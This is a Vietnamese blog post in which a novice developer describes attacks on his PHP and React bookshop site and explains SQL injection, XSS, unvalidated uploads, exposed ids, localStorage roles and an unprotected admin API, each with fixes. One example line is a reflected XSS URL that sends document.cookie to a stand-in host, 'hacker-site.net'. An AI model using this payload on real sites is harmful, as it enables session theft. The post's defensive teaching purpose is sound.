## Lời mở đầu
![](https://images.viblo.asia/0c722834-3f0d-4146-8781-345114740c81.jpg)
Tình hình là một newbie tập tọe mày mò tập code. Mình muốn tự thiết kế một trang web cho riêng mình với mục đích là bán sách online. Hồi trước ở trường đại học mình có được học môn lập trình PHP, mình qua môn này với mức điểm rất là cao =)). Chính vì vậy mình quyết định chọn PHP là ngôn ngữ cho backend của trang web. Nghe thiên hạ đồn react là một thư viện, framework mạnh mẽ để thiết kết frontend nên mình quyết định chọn nó làm frontend cho website. Và cấu trúc của website cũng khá đơn giản thôi như này này:
+ Backend: PHP, Firebase (realtime database)
+ Frontend: Reactjs (javascript)
+ Authenticate: Json Web Token (JWT)

Và sau một thời gian code và mình đã cho ra siêu phẩm:

http://book-utt.herokuapp.com/
## Trang web của tôi bị tấn công

![](https://images.viblo.asia/81eba9e0-da12-4490-a63d-37e99b92b996.jpg)

Sau một thời gian sử dụng như minh cảm nhận là khá ngon lành: http://book-utt.herokuapp.com/
Vào một ngày đẹp trời hacker đã gửi mail cho mình và đòi 1 số tiền lớn không sẽ phá tan trang web của mình :(.
### 1. Lỗ hổng sql injection
![](https://images.viblo.asia/0a22092c-668d-48f2-af59-2172a6f5a413.jpg)
Theo nguồn wikipedia thì tạm giải thích lỗi này có nghĩa là:
>SQL injection là một kỹ thuật cho phép những kẻ tấn công lợi dụng lỗ hổng của việc kiểm tra dữ liệu đầu vào trong các ứng dụng web và các thông báo lỗi của hệ quản trị cơ sở dữ liệu trả về để inject (tiêm vào) và thi hành các câu lệnh SQL bất hợp pháp. SQL injection có thể cho phép những kẻ tấn công thực hiện các thao tác, delete, insert, update, v.v. trên cơ sở dữ liệu của ứng dụng, thậm chí là server mà ứng dụng đó đang chạy. 

Và tất nhiên rồi do không testing kỹ càng mình đã bị dính phải một lỗi nguy hiểm này
![](https://images.viblo.asia/a6ecbddc-6570-4d0c-a55b-15b0851d1508.png)

Cụ thể là chức năng đăng nhập của mình cũng bị hacker tấn công bằng lỗi nghiêm trọng này ahuhu. Hacker đã đăng nhập vào các users để làm loạn hệ thống. Cũng may là trang web của mình chưa có quá nhiều users nếu không thì mình sẽ mất một đống tiền rồi.

**Hướng giải quyết:**
Đừng quá lo lắng và giải quyết lỗi sql injection bằng một số cách như sau:

- Đảm bảo rằng validate input của người dùng ở cả client và trên server, dữ liệu người dùng luôn phải được xác thực trước khi đưa vào câu lệnh SQL.
- Dùng các câu lệnh tham số
- Tránh trả đúng vị trí và chi tiết các lỗi trả về. *Ex: đừng nên trả về đúng lỗi sai email hay password khi đăng nhập, ...*
- Hãy loại bỏ các kí tự meta như '"/\; và các kí tự extend như NULL, CR, LF, ... trong các string nhận được từ:
    * input do người dùng gửi lên
    * các tham số từ URL
    * các giá trị từ cookie
* .........

### 2. Các cuộc tấn công Cross Site Scripting (XSS)
![](https://images.viblo.asia/31820c20-4b11-443a-a848-be3257a3139d.jpg)

Cross Site Scriptng hay được biết nhiều đến cái tên viết tắt **XSS**:  là kỹ thuật tấn công code injection ngay trên phía client. Kẻ tấn công nhằm mục đích khai thác các lệnh độc hại trong trình duyệt web của nạn nhân bằng cách đưa các đoạn mã độc vào trong các ứng dụng hoặc trình duyệt web. Cuộc tấn công XSS chỉ thực sự diễn ra khi nạn nhân truy cập vào trang web hoặc ứng dụng thực thi các đoạn mã độc. Trang web hoặc ứng dụng web sẽ trở thành phương tiện giúp kẻ tấn công phân phối mã độc tới trình duyệt web người dùng. Các phương tiện dính lỗ hổng bảo mật thường là các forum, trang thông báo và các trang web cho phép bình luận.

XSS được chia làm ba loại chính: **Reflected**, **Stored** và **DOM based**.

**Reflected XSS:**
Một trong những cách được biết đến nhiều nhất là:
Chiếm phiên làm việc của người dùng (session), hacker truy cập được dữ liệu và chiếm quyền của người dùng trên website. Các bạn dùng facebook rất hay bị mất acc khi click vào các link nhạy cảm đúng không ạ =)). Cụ thể hacker sẽ làm như sau:
![](https://images.viblo.asia/204896c4-99cc-46b3-bde2-45843440721c.png)
Như chúng ta đã biết sau mỗi lần đăng nhập website sẽ sinh ra cho chúng ta một SessionId: agagf4tsajfjsfshfjsdfsdfjfjhhh như vậy đúng không ạ. Bạn click nhầm 1 một link được mã hóa kiểu
```http://book-utt.herokuapp.com/name=var+i=new+Image;+i.src=”http://hacker-site.net/”%2bdocument.cookie;``` và sessionId sẽ bị đọc và gửi đến trang của hacker. Và acc của các bạn đã bị hack =)).

*Hiện tại XSS đang là lỗi được khai thác nhiều nhất để cho các bug hunter khai thác và lấy tiền thưởng từ Facebook, Google.... :D*

**Stored XSS:**
là dạng tấn công mà hacker chèn trực tiếp các mã độc vào cơ sở dữ liệu của website. Dạng tấn công này xảy ra khi các dữ liệu được gửi lên server không được kiểm tra kỹ lưỡng mà lưu trực tiếp vào cơ sở dữ liệu. Khi người dùng truy cập vào trang web này thì những đoạn script độc hại sẽ được thực thi chung với quá trình load trang web.

Ví dụ như chức năng comment trong blog, website, message... 
![](https://images.viblo.asia/93f9313d-f692-4c56-9666-576fb86df279.png)

**DOM based XSS:** DOM viết tắt của Document Object Model là 1 dạng chuẩn của W3C đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML. Mô hình này thể hiện tài liệu dưới dạng cấu trúc cây phân cấp. Tất cả các thành phần trong HTML, XML đều được xem như một node. DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML. 
**Giải pháp:**
- Encode dữ liệu gửi lên và trả ra từ server.
- Loại bỏ các ký tự html và javascript đặc biệt trước khi lưu data và CSDL (PHP có thể dùng function strip_tags, Laravel có thể dùng HTML Purifier)
- Loại bỏ các ký tự html và javascript đặc biệt trước khi hiển thị dữ liệu phía client (javascrip sửa dụng hàm escape lodash)

### 3. Không validate file upload và validate dữ liệu ở client nhưng không validate trên server
![](https://images.viblo.asia/d6978d98-f0f5-4ec5-a3cd-1c9a785eeae3.png)

Mình không validate file upload nên hacker đã gửi lên 1 file .php lưu vào trong server, file này chính là mã độc và đương nhiên hacker đã chiếm quyền trên server.
**Giải pháp:**
- Validate file trên cả client và server.
- Validate cả phần extension và phần content-type.
- Các folder và file upload trên server nên chỉ để quyền đọc, nếu có quyền ghi thì nên check theo quyền user.
- Folder và file được lưu theo cấu trúc folder nhiều lớp và theo một thuật toán của riêng bạn.
### 4. Đặt params cho page bằng id
![](https://images.viblo.asia/376fa1f1-52c0-4a2b-8083-3a71e8b95e50.png)
Do bất cẩn nên mình đã đặt param trong page user profile là id. Điều này đã khiến hacker biết được id của user và đoán được vị trí của các users.
### 5. Phân quyền user bằng việc sử dụng localStorage
![](https://images.viblo.asia/80fcede9-fab8-43d4-a74c-c4b7206f0d4a.png)
Sử dụng localStorage để lưu quyền với id của user, dẫn đến tình trạng truy cập bất hợp pháp.
### 6. Dữ liệu trả qua api không thiết lập 
![](https://images.viblo.asia/6f71972a-107a-4718-9eaf-c40f2b074147.png)
Api cho admin không thêm authenticate và authorization.
## Tạm kết
Qua bài viết chắc rằng các bạn đã có thêm một chút kiến thức về bảo mật để bảo vệ cho trang web bảo vệ cho người dùng. Rất mong được sự góp ý của các bạn
![](https://images.viblo.asia/44306c29-91cb-43f1-9ca1-b6ebeb10fb48.jpg)